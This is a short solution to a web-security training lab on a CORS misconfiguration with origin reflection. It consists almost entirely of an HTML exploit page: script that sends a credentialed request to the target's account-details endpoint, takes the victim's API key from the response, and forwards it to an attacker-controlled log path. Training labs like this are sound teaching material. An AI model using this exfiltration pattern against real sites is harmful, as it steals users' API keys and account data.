# Lab: CORS vulnerability with basic origin reflection
## Description
NA

## Solution
```html
<html>
<head></head>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://target.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var obj = JSON.parse(this.responseText);
location='/log?key='+obj.apikey;
};
</script>
</body>
</html>
```